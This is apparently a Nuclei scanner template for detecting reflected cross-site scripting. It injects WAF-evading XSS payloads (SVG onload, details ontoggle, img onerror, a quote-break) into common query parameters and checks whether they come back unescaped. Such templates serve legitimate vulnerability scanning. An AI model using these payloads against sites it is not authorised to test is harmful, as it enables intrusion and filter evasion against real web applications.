http:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - <svg/onload=confirm(1)>
    - <details open ontoggle=confirm(1)>
    - <img src=x onerror=confirm`1`>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?q={{payload}}'
  - '{{BaseURL}}/?search={{payload}}'
  - '{{BaseURL}}/?id={{payload}}'
  - '{{BaseURL}}/?query={{payload}}'
  payloads:
    payload:
    - <svg/onload=confirm(1)>
    - <details open ontoggle=confirm(1)>
    - <img src=x onerror=confirm`1`>
    - <input autofocus onfocus=confirm(1)>
    - '''-confirm(1)-'''
  stop-at-first-match: false
id: advanced-xss-precision-bypass
info:
  author: thenawabx
  description: Targeted at bypassing modern WAFs and sanitizers using SVG, details,
    and encoding.
  name: Advanced XSS Bypass & Execution Verifier
  severity: high
  tags: xss, advanced, waf-bypass
